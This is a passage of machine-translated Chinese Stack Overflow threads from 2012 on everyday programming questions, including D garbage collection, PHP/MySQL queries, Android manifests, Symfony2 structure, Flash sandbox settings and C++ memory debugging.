```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-01T17:26:43.080

Phonon 是由 KDE 设计并被 Qt 采用的包装库。该库的目的是增加多媒体应用程序的可移植性，抽象出执行媒体播放的实际子系统的细节。在 Windows 上，DirectShow 播放实际文件；在 OS X 上，QuickTime。在 Linux 上，任何数量的媒体后端都可以播放文件，并且它们都有自己的功能。使用 VLC 后端，您可以在所有平台上播放几乎所有内容！

结果是，作为应用程序开发人员，您不知道 Phonon 能够在运行您的代码的计算机上播放哪些格式。然而，Phonon 确实提供了一些机制来找出正在使用的后端及其功能。[本教程](http://doc-snapshot.qt-project.org/4.8/phonon-capabilities.html)就是一个很好的例子——尽管它是用 C++ 编写的。应该很容易理解并移植到 python。

# arrays - 垃圾收集器是否保留仅由原始指针引用的数组？

> ID：12192691
> 
> 赞同：8
> 
> 时间：2012-08-30T08:19:58.510
> 
> 标签：arrays, garbage-collection, heap-memory, d

我想从垃圾收集堆中分配一个元素数组，并仅通过原始指针访问这些元素。垃圾收集器是否能够在所有指向它的指针超出范围之后（而不是之前）回收该内存块？

我正在考虑这样做：

```
{
    int* ptrToArray1 = (new int[](100)).ptr;
    int* ptrToArray2 = ptrToArray1;
    int* ptrToArray3 = ptrToArray1 + 10;

    ptrToArray1 += 50;
    ptrToArray2 += 99;

    *ptrToArray1 = 123;
    *ptrToArray2 = 456;
    *ptrToArray3 = 789;

    ptrToArray1 -= 42;
    ptrToArray2 -= 24;

    //... and so on ... Is the array data guaranteed to be there?
}
// Now that all the pointers are out of scope, can the
// garbage collector reclaim the memory block of that array? 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-30T08:23:45.490

您的方案将起作用。

两件事情：

1.  垃圾收集器是保守的。这意味着它会扫描堆栈、寄存器和 GC 堆的原始字。任何看起来像指向 GC 分配的内存的指针都会被认为是这样的，因此保持那块内存处于活动状态。
2.  垃圾收集器允许内部指针。原因有两个。首先，（在系统语言中）仅使用指针算法迭代原始内存是相当普遍的，因此 GC 必须处理这样的情况，其中只有一个偏移指针指向 GC 内存。其次，D 中的接口实际上只是与基础对象的偏移量，因此这些接口需要保持原始对象处于活动状态。

值得注意的是，内部指针显着减慢了垃圾收集器的标记阶段，但在像 D 这样的系统语言中，不支持内部指针是不合理的。

最后，请注意，如果您将指向 GC 分配内存的指针存储在 GC 堆和堆栈/寄存器之外，则 GC*不会拾取它*。也就是说，如果您将一些数组存储`.ptr`在某个`malloc`'d 内存中，然后丢弃对它的所有引用，例如，它将不会被认为是实时的。

# php - Foreach 循环导致重复的 div

> ID：12192696
> 
> 赞同：-2
> 
> 时间：2012-08-30T08:20:27.423
> 
> 标签：php, arrays, join, foreach, duplicates

我有一个连接查询，它给了我一个结果数组。

我加入了评论，当我发表评论并且有多个评论时，它不会将其放在父帖子下，而是复制它。

## 我的代码

```
<div class="stream-posts">
    <?php if(isset($posts)): ?>
    <?php foreach(array_merge($posts) as $post): ?>
        <div id="stream_post_<?php echo $post['stream_id']; ?>" class="span6 stream-content">
            <span class="user"><a href="#"><?php echo $post['full_name']; ?> </a> <abbr class="stream-posted"><?php echo Date::time_ago( $post['date']) ?></abbr> </span>
            <p><?php echo Input::auto_link(Input::nl2br_limit($post['stream_text'], "2")); ?></p>
            <div class="clear"></div>
            <div class="feedback">
                <a href="#" class="like" rel="nofollow">Tetszik</a> - 
                <a href="#" class="comment" rel="nofollow">Hozzászólás</a>
            </div>
            <div class="clear"></div>
                <div class="comments-text">
                    <?php if(count($post['like_id']) > 0): ?>
                        <?php echo count($post['like_id']); ?>
                    <?php endif; ?>
                </div>
            <div class="stream-comment">
                <form class="stream-comment-form">
                    <input type="hidden" name="comment_post" value="<?php echo $post['stream_id']; ?>">
                    <textarea name="comment_text"></textarea>
                    <button type="submit" class="btn btn-primary btn-mini pull-right">Hozzászólok</button>
                </form>
            </div>
        </div>
        <div class="clear"></div>
    <?php endforeach; ?>
    <?php endif; ?>
</div> 
```

我知道`foreach`是问题所在，想问有没有办法合并这些结果而不是重复？

我试过了，`array_merge`但没有运气。

## 询问

```
static function get_stream()
    {
        $query = DB::select()->from('stream_post');
        $query->join('stream_comment', 'LEFT');
        $query->on('stream_post.stream_id', '=', 'stream_comment.comment_stream_id');
        $query->join('stream_likes', 'LEFT');
        $query->on('stream_post.stream_id', '=', 'stream_likes.like_stream_id');
        $query->join('users_metadata');
        $query->on('stream_post.user_id', '=', 'users_metadata.user_id');
        $query->group_by('stream_post.stream_id');
        $query->order_by('stream_post.stream_id', 'DESC');
        $result = $query->execute();
        if(count($result) > 0) {    
            foreach($result as $row)
            {
                $data[] = $row;
            }

            return $data;
        }

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:24:55.893

`array_merge($posts)`什么都不做。

问题一定是您的`$posts`数组中的数据，我对给出的数据的猜测是您没有`GROUP BY`在 SQL 查询中执行以提取注释，从而导致数据库中出现多个。

# java - 关于存储套接字的 Java 套接字提示

> ID：12192698
> 
> 赞同：0
> 
> 时间：2012-08-30T08:20:34.570
> 
> 标签：java, sockets

我在 java 中创建了一个聊天应用程序。我作为 Eclipse RCP 制作的前端。之前我创建了一个视图，它显示了有多少用户被记录。现在我创建了另一个视图，它是另一个插件项目，我想在那个视图中做不同的活动。如果我在聊天应用程序中创建一个会话概念，其中键是用户名，值是套接字，那可以吗？这是一个好方法吗？因为我想在新创建的对象中获取套接字对象。我不想创建新的套接字对象。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:29:45.153

有替代方案吗？如果您需要两个视图中的套接字，那么您必须将它们放在一个中心位置，并且您需要给它们一个可以传递给视图的密钥。所以这种方法对我来说听起来很合理。

但也许最好将套接字包装在一个辅助类中，该类实现您的视图所需的方法。这样，您可以将所有通用代码保存在一个地方。

更重要的是：如果您需要更改聊天协议，现在可以在您的助手类中进行，并且视图不必更改。

为此，请将您的管理器变成一个 OSGi 服务并让 Eclipse 将其注入您的视图中。请参阅[使用 Eclipse 构建轻量级 OSGi 应用程序](http://www.ibm.com/developerworks/opensource/library/os-eclipse-osgi/index.html)

# html - css对齐在ie7中中断但在其他地方工作

> ID：12192703
> 
> 赞同：0
> 
> 时间：2012-08-30T08:20:47.543
> 
> 标签：html, css, internet-explorer, cross-browser

请参阅此页面：[https ://tjandpals.com/howto-html](https://tjandpals.com/howto-html)

在现代 firefox、safari、chrome 和 internet explorer 中看起来很正常。

但是-在 ie7 中，它破坏了对齐方式...

有什么线索可以使它更兼容吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:35:25.067

你可以在给定的类上使用 ie7 hack：

```
.leftAd {*top:60px}
.TopAd{*float:none;*width:600px} 
```

这个东西在ie7中可以正常工作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:32:43.387

作为第一步（对不起，但目前我只有一点时间），您可以将#HowToLanding DIV 的高度设置为自动。这会使瓷砖处于正确的位置。

你可以这样做：

```
#HowToLanding { height: 550px; *height: auto; } 
```

**更新：** ...并对#Footer 执行相同的操作

```
#Footer { height: 150px; *height: 150px; ... } 
```

HTH，
--汉森

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:50:17.443

在里面添加`<div id="TopAd">...</div and <div id="TopAd">...</div>`你

```
<div id="HowToLanding">..</div> 
```

# android - 查找对特定 android sdk 级别的所有调用

> ID：12192705
> 
> 赞同：1
> 
> 时间：2012-08-30T08:20:50.217
> 
> 标签：android

我需要将 Android 应用程序移植到旧版本。也就是说，该应用程序现在在 4.0 中运行，但不在 2.2 中，所以我需要找到所有与 2.2 不兼容的 API 调用并做一个解决方法。

有什么工具可以轻松做到这一点吗？该工具在理论上应该很简单，它只需要找到所有函数调用并检查它的“@since”属性，但我找不到。

我想知道其他人是怎么做到的。如果我找不到这个工具，我可能会去做，但我不知道我会有多少时间，或者即使我会拥有所需的技能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:23:06.697

只需将 Project Build Target 更改为 2.2 --> Eclipse 会将所有内容标记为红色，这是不受支持的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:27:20.080

如果您有用于构建 APK 的源文件，请右键单击项目 -> 属性 -> Android。选择 API 级别 8。不支持您在 Java 文件中看到的任何错误。简单的！

# php - MYSQL + PHP 按排序顺序一次一条记录

> ID：12192706
> 
> 赞同：-2
> 
> 时间：2012-08-30T08:20:56.653
> 
> 标签：php, mysql

所以，我有一个页面`allocate.php?id=XXXXX`。它基本上是根据 id 值从数据库中的各个表中提取数据，并相应地显示出来。它还允许用户编辑和处理相关数据。

现在，与 id 值关联的主表也有一个字段“优先级”，它决定了我需要遍历表的顺序。问题是：

1.  假设我在“allocate.php?id=10000”页面上。它的“优先级”值为 1。

2.  下一页应显示“优先级”值为 2 的详细信息。它被分配给 ID 为“20001”的课程。基本上，我希望接下来转到“allocate.php?id=20001”。

3.  那么如何在每个分配页面上提供一个动态链接，该链接链接到下一个最高优先级分配的 id 值？

如果您需要更多信息，这里是确切的表格：

```
CREATE TABLE IF NOT EXISTS `course` (
  `id` varchar(11) NOT NULL,
  `name` varchar(30) NOT NULL,
  `priority` int(2) NOT NULL,
  PRIMARY KEY (`id`)
) 
```

以下是值：

```
TUSCE100101
Course 101
1

TUSCE100102
Course 102
2

TUSCE100201
Course 201
2

NTUSCE100202
Course 202
3

TUSCE200301
Course 301
1

TUSCE200302
Course 302
4 
```

谢谢！

编辑：对于那些低估这个问题的人可能认为它太简单或者我没有进行足够的研究，我的问题是当我检查优先级大于等于并排序结果时，不计算当前页面，那么我可能处于我在相同优先级的课程之间切换的情况。例如：

1.  课程 101,102 和 103 具有相同的优先级。

2.  我在 101，搜索下一个的查询以随机顺序给我 102 和 103。我选择第一个值，比如 102。

3.  现在在 102 上，相同的搜索选择查询会给我 101 和 103，第一行可能是 101。所以我最终来回切换。

编辑 2

所以，我最终解决了这个问题。这里供以后参考。

我定义了一个名为“访问”的附加列，以指示特定行是否已被访问。未访问时默认值为 0。

访问每一行后，我将访问值标记为 1，并根据“SELECT id FROM course WHERE priority >= $currentPriority AND id!=$currentId AND visit=0”之类的查询选择下一个值。

在最后一行，当上述选择查询不返回任何内容时，我再次将所有“访问”设置为 0，并仅根据基于“优先级”的有序查询选择第一个。这使我可以无限循环遍历表格。

PS感谢您的所有帮助。老实说，我对社区的奇怪反应感到有些失望，尽管我相信我的问题是我的问题不是很清楚。对我的解决方案的反馈将不胜感激。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-30T08:24:44.927

```
SELECT * FROM course WHERE id!=$currentID AND priority>=$currentPriority ORDER BY priority ASC 
```

此 SQL 查询将为您提供下一项。

# java - 我如何在 Windows azure 上部署 Java 应用程序

> ID：12192709
> 
> 赞同：3
> 
> 时间：2012-08-30T08:21:04.507
> 
> 标签：java, azure, cloud, web-deployment, azure-web-app-service

嗨，我是计算机科学专业的三年级学生，我已经在 netbeans 上用 Java 创建了一个三年级的项目，现在我想将它部署到具有 Windows azure 的虚拟机上。重点是我希望能够在任何连接到互联网的计算机上使用这个应用程序，只需访问云，而不必每次都安装程序（就像你可以在 Steam 上玩任何游戏一样）在任何电脑上）。现在的问题是，是否有可能，如果可以，我该怎么做提前谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-01T20:53:59.793

作为[Cloudify](http://www.gigaspaces.com/cloudify-open-paas-stack)开发团队的一员，我想推荐以下内容：

[Cloudify for Azure](http://www.gigaspaces.com/azure)提供了这一点。创建它是为了让您可以轻松地在 Azure 上使用任何 Java 应用程序。

[Cloudify](http://www.gigaspaces.com/cloudify-open-paas-stack)是一个免费的开源项目，作为[CloudifySource](http://www.cloudifysource.org)组织的一部分进行维护。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-04T00:24:41.013

今天我们宣布支持在 Windows Azure 网站上部署 Java Web 应用程序 - [http://azure.microsoft.com/en-us/documentation/articles/web-sites-java-get-started/](http://azure.microsoft.com/en-us/documentation/articles/web-sites-java-get-started/) - 看看吧。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:29:20.843

是的！使用 Windows Azure，您不仅限于 .NET。您可以使用 Java、Python、Node、PHP……在 Windows Azure 官方网站上有一些很好的入门教程。

*   云服务/PaaS：[在 Eclipse 中为 Windows Azure 创建一个 Hello World 应用程序](http://msdn.microsoft.com/en-us/library/windowsazure/hh690944)
*   虚拟机/IaaS：[如何在虚拟机上运行 Java 应用服务器](http://www.windowsazure.com/en-us/develop/java/tutorials/tomcat-on-a-virtual-machine/)

除此之外，您可能还想查看[Interoperability Bridges](http://www.interoperabilitybridges.com/Projects.aspx)网站。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T19:33:37.197

您还可以尝试[Azure Runme](https://github.com/robblackwell/AzureRunMe)项目。据我所知，有一些商业项目使用这个项目在 Azure 上运行他们的 Java 应用程序。

# php - html dom 解析器 php 数组

> ID：12192710
> 
> 赞同：1
> 
> 时间：2012-08-30T08:21:07.267
> 
> 标签：php, html-parsing, web-scraping, simple-html-dom

上面的代码有效，但只返回数组的第一个元素，可能是因为我在 $item 中设置了 0。如果我删除 0，我会收到“Array”消息。如何获得完整的循环并将其放入我的表格输出中？谢谢。

```
<?php
include_once('simple_html_dom.php');
$target_url = "http://www.theurlscraped.com";
$html = new simple_html_dom();
$html->load_file($target_url);

foreach($html->find('div[class=class0]') as $post) {

$item['url'] = $post->find('a.class1', 0)->href;
$item['image'] = $post->find('img.class2', 0)->src;
$item['descrizione'] = $post->find('span.class3', 0)->plaintext;
$item['price'] = $post->find('span.class4', 0);
}?> 
```

编辑：要抓取的页面结构：

```
<div class="class0">
    <a class="class1" href="/another/page">
        <span class="class3">
            <span class="class6">
                Hello world!
            </span>
        Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore....
        </span>
        <span>
            <span>
                <span class="class4">tag</span>
                <span class="class5">tagtag</span>
            </span>
            <img class="class2" src="http://www.urlsourceimage.com/img.jpg">
        </span>
    </a>
    <a class="class1" href="/another/page">
        <span class="class3">
            <span class="class6">
                Hello world, this is me! 
            </span>
        Quis aute iure reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
        </span>
        <span>
            <span>
                <span class="class4">tag1</span>
                <span class="class5">tagtag1</span>
            </span>
            <img class="class2" src="http://www.urlsourceimage.com/img1.jpg">
        </span>
    </a>

    ...

    <a class="class1" href="/another/page">
        <span class="class3">
            <span class="class6">
                Life should be fun for everyone!
            </span>
        Excepteur sint obcaecat cupiditat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
        </span>
        <span>
            <span>
                <span class="class4">tag2</span>
                <span class="class5">tagtag2</span>
            </span>
            <img class="class2" src="http://www.urlsourceimage.com/img2.jpg">
        </span>
    </a>
</div> 
```

期望输出：

```
<table>
  <tr>
    <td rowspan="2"><a href="<?php echo $item['url'];?>"><img src="<?php echo $item['image'];?>" /></a></td>
    <td><a href="<?php echo $item['url'];?>">Price: <?php echo $item['price'];?></a></td>
  </tr>
  <tr>
    <td><?php echo $item['descrizione'];?></td>
  </tr>
  <tr>
    <td><a href="<?php echo $item['url'];?>">dettagli offerta &raquo;</a></td>
    <td><?php echo $item['price'];?></td>
  </tr>
</table> 
```

编辑：我也尝试了这个解决方案，但返回和无限循环：

```
<?php
include_once('simple_html_dom.php');
$html = file_get_html('http://www.theurlscraped.com');

foreach($html->find('div[class=class0]') as $table) {
$urls = $table->find('a.class1');
$images = $table->find('img.class2');
$descrizioni = $table->find('span.class3');

    foreach($urls as $url)
    foreach($images as $image)
    foreach($descrizioni as $descrizione)
    {
        echo "URL = " . $url->href ."<br />";
        echo "Img = " . $image->src ."<br />";
        echo "Descrizione = " . $descrizione ."<br />";
    }
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:35:10.797

您想抓取一个站点并在其中显示一些内容，这些内容显示在表格的 class0 中，您需要的是：

您需要在主 foreach 循环中请求查找的任何位置删除 0，并以这种方式围绕这些查找语句包装另一个循环：

`foreach($post->find('a.class1') as $element)`

您需要在这些内部循环下回显 $element ，将它们包装在方便的列和行中。

如果你不明白，请告诉我，我会在晚上不忙的时候把整件事写给你。谢谢

# android - 不支持的语言文本到语音引擎为 android

> ID：12192713
> 
> 赞同：0
> 
> 时间：2012-08-30T08:21:10.923
> 
> 标签：android, text-to-speech

您好我正在构建一个使用 tts 引擎的 android 应用程序。我需要该应用程序说不受支持的语言，无论是印地语（印度语言）。是否可以？

谷歌搜索了几个小时后，我发现了这个 [https://groups.google.com/forum/?fromgroups=#!topic/tts-for-android/_1-JG149quw](https://groups.google.com/forum/?fromgroups=#!topic/tts-for-android/_1-JG149quw)

但是我在哪里可以找到支持印地语的 android tts 引擎？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T04:08:57.247

eSpeak TTS 引擎（可在[此处](https://play.google.com/store/apps/details?id=com.googlecode.eyesfree.espeak)的 Play 商店获得）支持印地语，但质量不是很好。

# architecture - Symfony2 确认应用程序和模块的自定义文件夹结构

> ID：12192718
> 
> 赞同：0
> 
> 时间：2012-08-30T08:21:29.233
> 
> 标签：architecture, symfony, symfony-1.4

使用 Symfony2 作为我的结构之一。我想将模块和与模块相关的各种文件从其他模块文件中抽象出来。

所以例如。我有前端应用程序。在前端应用程序下，我有用户、图库模块。我想将所有与用户相关的文件保存在一个地方，将所有与画廊相关的文件保存在一个地方。通过这种方式，我实现了模块级别的抽象，就像 Symfony1.4 中提供的那样。

以下是我到这里实现的文件夹结构。

```
 web/
       admin.php
       frontend.php

    apps/
        autoload.php # this autloads the common libaries/vendors for all application eg. CommonBundle
        admin/
               AppKernel.php
               AppAutoload.php # load application specific libraries
               bootstrap.php.cache
               config/
               cache/
               .
               .
               .
            frontend/
               AppKernel.php
                AppAutoload.php
               bootstrap.php.cache
               config/
               cache/
               .
               .
               .

    src/
        Admin/
            UserBundle/
                Controller/
                    UsersController.php
                Entity/
                    User.php
                Repository/
                    UserRepository.php
                Resources/
                    views/
                     indexUserView.twig.html
            DiaryBundle/
                Controller/
                    DiaryController.php
                Entity/
                    Diary.php
                Repository/
                    DiaryRepository.php
                Resources/
                    views/
                     indexDiaryView.twig.html
        Frontend/
            UserBundle/
                Controller/
                    UsersController.php
                Entity/
                    User.php
                Repository/
                    UserRepository.php
                Resources/
                    views/
                     indexUserView.twig.html
            DiaryBundle/
                Controller/
                    DiaryController.php
                Entity/
                    Diary.php
                Repository/
                    DiaryRepository.php
                Resources/
                    views/
                     indexDiaryView.twig.html 
```

我对上述文件夹结构充满信心。但是当我发现 Symfony2 社区支持在应用程序级别而不是在模块级别创建 Bundle 时，我想知道在模块级别创建 Bundle 的优缺点。在模块级别创建可能的陷阱是什么？

我可以看到为模块提供捆绑包的许多优点

1.  一个模块的所有Controller、Views、Models都在同一个地方，并从其他模块的Controller、Models、Views中抽象出来。这样，在一个模块上工作的人必须只在一个文件夹内工作，而不必担心模块2（即Bundle2）中正在进行的工作

2.  清除缓存可以在应用程序级别使用以下命令清除缓存仅用于前端应用程序

    `shell> php apps/frontend/console cache:clear`

3.  如果您需要在前端应用程序中创建一个包，命令如下。它在 src/frontend 应用程序下创建 UserBundle。它还在apps/frontend/AppKernel.php 中注册包名称。

    `shell> php apps/frontend/console generate:bundle --namespace=frontend/userBundle --format=yml`

所以一切似乎都很好。但似乎 Symfony2 社区并不认为这种做法是正确的？

请在我的方法中提出漏洞？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T09:53:46.627

我认为你不应该那样做...

Symfony2中没有这样的东西`module`。有一篇食谱 [文章](http://symfony.com/doc/current/cookbook/symfony1.html)解释了 Symfony2 和 symfony1 之间的区别。我认为您在谈论不同的应用程序。您可以拥有不同的应用程序，但不[建议](http://symfony.com/doc/current/cookbook/symfony1.html#applications)这样做，您应该创建另一个项目并共享捆绑包。

我认为你想要实现的这个项目会破坏很多东西，你将无法再使用第三方包。

有一项倡议要求[`KnpRad`](http://rad.knplabs.com/)使 Symfony2 的项目结构更加 RAD 友好，但他们有很多问题，这个项目现在似乎已经死了。

[从他们的博客](http://knplabs.com/blog/knp-rad-bundle-feedback)中引用：

> 在当前的实现中，Symfony2 几乎在任何地方都有硬编码路径来捆绑资源。这意味着，为了改变文件夹结构，我们需要覆盖所有 Symfony2 命令、扩展和编译器通道。它在我们的代码库中创造了一个鸿沟，并在一些捆绑包中引入了 BC 中断。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T12:49:17.153

Neetu.. Symfony1.4 和 symfony2 有很大的不同。根据 symfony2，您需要在 src 文件夹下生成应用程序，此处应用程序名称将是命名空间，在命名空间下，您可以创建在 symfony1.4 中称为模块的包。命令是：

> php app/console generate:bundle --namespace=Yournamespace/yourBundle --format=yml php app/console cache:clear --env=prod --no-debug 您可以根据需要创建应用程序。

# linux - 测试目标文件是否独立于操作系统

> ID：12192721
> 
> 赞同：0
> 
> 时间：2012-08-30T08:21:38.470
> 
> 标签：linux, compilation, makefile

我有几个用于 vxWorks 项目的目标文件 (.o)，没有源代码。

我如何测试它们是否独立于操作系统？

我尝试将它们用于 Linux 项目。它们应该包括 openGL 的东西。

编辑：

我有一个带有 S3 的图形板。有一个可用的驱动程序，但仅适用于 vxWorks。我找到了 vxWorks 的启动脚本。在此将加载几个 Objekt 文件。

例如这个

```
ld 1,0,"lib/libGL.o"        
ld 1,0,"lib/libGLU.o" 
```

而且我认为它们独立于操作系统。但我不确定。因为我尝试将此板与 Linux 一起使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:26:22.130

将它们与`main()`函数联系起来。如果您没有收到错误，那么他们不使用操作系统特定的功能。

**[编辑]**目标文件是链接的，不包括在内。您需要编写一个`main()`调用`.o`文件中代码的函数（查看 OpenGL 文档以获取名称）。

现在你可以编译它：

```
 cc -c -o main.o main.c
 cc -o main main.o lib/libGL.o lib/libGLU.o 
```

# actionscript-3 - 需要绕过错误 #2047：违反安全沙箱：AS3 加载外部视频 swf

> ID：12192731
> 
> 赞同：1
> 
> 时间：2012-08-30T08:22:20.667
> 
> 标签：actionscript-3, air2

又是我……我需要在 AIR2 应用程序上转到第 2 帧，但沙盒交易让我发疯了……

这就是我加载 MovieClikp 的方式：

```
function startLoad()
{
var mLoader:Loader = new Loader();
var mRequest:URLRequest = new URLRequest("http://localhost/Player-More/video/index.swf");
mLoader.contentLoaderInfo.addEventListener(Event.COMPLETE, onCompleteHandler);
mLoader.contentLoaderInfo.addEventListener(ProgressEvent.PROGRESS, onProgressHandler);
mLoader.load(mRequest);
}
function onCompleteHandler(loadEvent:Event)
{
        addChild(loadEvent.currentTarget.content);
}
function onProgressHandler(mProgress:ProgressEvent)
{
var percent:Number = mProgress.bytesLoaded/mProgress.bytesTotal;
trace(percent);

}
startLoad(); 
```

这是我在加载电影的最后一帧中的动作脚本：

```
MovieClip(parent.parent).play(); 
```

我在使用 AS2 时从来没有遇到过这个问题，而且随着 Adob​​e 所做的每一次新更新，它都会变得更糟。

对最后一条评论感到抱歉，但我已经尝试了其他帖子中的所有解决方案，但我无法让它发挥作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:32:16.457

如果您在本地调试，您可以在 Flash 播放器设置中添加加载 swf 或 html 的本地路径，右键单击并转到全局设置，然后单击链接中的全局安全设置面板左侧，在对话框中选择您的本地文件系统位置。 [http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager04.html](http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager04.html)

如果你从一个域访问另一个[http://www.domain1.com/a.swf](http://www.domain1.com/a.swf)访问[http://www.domain2.com/b.swf](http://www.domain2.com/b.swf)那么你必须有一个[http://www.domain2 .com/crossdomain.xml](http://www.domain2.com/crossdomain.xml)允许 swf 1 访问 swf 2。

# android - Nexus 7 平板电脑的 android 清单

> ID：12192736
> 
> 赞同：0
> 
> 时间：2012-08-30T08:22:32.103
> 
> 标签：android, manifest, apk, google-play, signing

我有应用程序 apk 文件，我希望它可以在 Nexus 7 平板电脑的 Google Play 中使用。不幸的是，上传后谷歌说这个apk与Nexus 7不兼容。我看到其他开发人员通过“软化”清单中的相机权限来解决这个问题。对我来说，这不起作用。我的清单如下所示。任何提示表示赞赏。谢谢

```
<?xml version="1.0" encoding="utf-8"?><manifest xmlns:android="http://schemas.android.com/apk/res/android"
  package="xxx.yyy.zzz"
  android:versionCode="12"
  android:versionName="1.2.2"
  android:installLocation="auto">
<uses-sdk android:minSdkVersion="8" />
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.CAMERA"/>
<uses-permission android:name="android.permission.SET_WALLPAPER"/>
<uses-feature android:name="android.hardware.camera" 
    android:required="false"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>

<application android:icon="@drawable/zenfolio_icon" 
             android:label="@string/app_name" 
             android:name=".ZenfolioApplication" 
             android:theme="@style/ZenfolioAppTheme" 
             android:debuggable="false"></application></manifest> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T17:25:50.970

尝试添加这个：

```
<uses-feature android:name="android.hardware.camera.autofocus" android:required="false"/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:41:54.520

尝试同时声明相关的子功能（闪光灯、自动对焦）`required="false"`。顺便说一句，这是整个清单吗？

[http://developer.android.com/guide/topics/manifest/uses-feature-element.html](http://developer.android.com/guide/topics/manifest/uses-feature-element.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:43:25.767

尝试在清单中设置它：

```
<supports-screens
    android:largeScreens="true"
    android:normalScreens="true"
    android:smallScreens="true"
    android:xlargeScreens="true" />

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="16" /> 
```

**EDIT2：**保留这个，并`<uses-feature android:name="android.hardware.camera"/>`从你的`Manifest`.

# c# - 一种方式同步两个文件夹

> ID：12192740
> 
> 赞同：0
> 
> 时间：2012-08-30T08:22:48.763
> 
> 标签：c#, directory

我有一个名为`OLD`. 它里面有一个目录结构，如：

```
Old  
---DSL  
---------CI  
------------AppFolder1    
------------AppFolder2  
---------------------------FUN2    
--------CA  
------------AppFolder1 
```

每个文件夹内可能有也可能没有文件。

我有一个名为`NEW`的文件夹，其中包含更新，并且取决于更改，其中包含适当的目录结构。关键是它将与 相同`OLD`。例如：

```
NEW  
---DSL  
---------CI  
------------AppFolder2  
---------------------------FUN2  
--------CA 
```

如您所见，目录结构（包括文件夹名称）相同。我希望所有文件都`NEW`替换`OLD`.

请为我提供一个起点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:54:23.117

我创建了一个`Old`具有以下结构的文件夹：

以老根`C:\Old`为例。

```
-Old
--CI
---AppFolder1
---AppFolder2 
```

里面什么`New`都没有。

然后运行我设置的控制台应用程序`NewRoot`并`C:\New`得到：

```
-New
--CI
---AppFolder1
---AppFolder2 
```

不确定这是否是您正在寻找的那种东西 - 如果没有建议您想以不同的方式做:)

```
private static void SyncDirectories(string oldRoot, string newRoot)
{
  CreateDirectoriesRecursive(Directory.GetDirectories(oldRoot), newRoot);
}
private static void CreateDirectoriesRecursive(string[] oldDirectories, string root)
{
  foreach (string oldDirectory in oldDirectories)
  {
    string directoryToCreate = root + @"\" + new DirectoryInfo(oldDirectory).Name;
    if (!Directory.Exists(directoryToCreate))
      Directory.CreateDirectory(directoryToCreate);
    if (Directory.GetDirectories(oldDirectory).Count() > 0)
      CreateDirectoriesRecursive(Directory.GetDirectories(oldDirectory), directoryToCreate);
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:45:25.000

您可以使用[FileSystemWatcher](http://msdn.microsoft.com/en-us/library/system.io.filesystemwatcher.aspx)类来控制 OLD 目录中的更改，以将它们重复到 NEW 目录中。

此外，您也可以将此手表放在 NEW 上，以管理那里不需要的访问。

# c++ - 如何修复内存损坏？

> ID：12192745
> 
> 赞同：-1
> 
> 时间：2012-08-30T08:23:07.810
> 
> 标签：c++, memory-management

我的程序中出现了一些奇怪的、无法解释的错误和崩溃。我一直在调试并环顾四周，我注意到我正在将一个变量设置为 NULL，但如果我在之后立即设置断点，`0xcdcdcd00`即使我只是将其设置为 NULL，该变量也会设置为。

看起来我的程序中发生了某种内存损坏。

找出内存损坏原因的一些好的技术是什么？在这开始发生之前我添加了一大块代码，所以在浏览我的代码时，我应该寻找什么会导致内存损坏？

我有一个名为 的类`monster`，它派生自一个名为`mob`

我执行以下代码：

`monster* newMon = new monster();`

它调用怪物类的构造函数：

```
monster::monster() : mob() {
    this->renderer = NULL;
} 
```

当我在这个函数结束时中断时，渲染器 =`0xcdcdcd00`或者有时`0xcdcdcdcd`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:29:19.990

你应该给自己一个好的静态代码检查器，例如 gimpel lint（它可以检测到很多这类东西），并且还应该使用 valgrind（它是免费的）或 purify 或其他一些运行时检查器。

但是，如果您将位置设置为零并且紧接着调试器说它不为零，您可能需要确保已关闭优化。即使是稍微优化的代码也会使调试器感到困惑，几乎无用。

出现的另一个问题是 - 此代码是多线程的还是您正在检查的内存与另一个进程共享？我怀疑在这种情况下，您将需要仔细检查您的代码以检测竞争危险，而我不知道有什么好的工具可以做到这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:35:07.360

这

```
monster::monster() : mob() {
    this->renderer = NULL;
} 
```

设置`renderer`为 NULL。我会把它改成

```
monster::monster() : mob(), renderer(NULL) {
} 
```

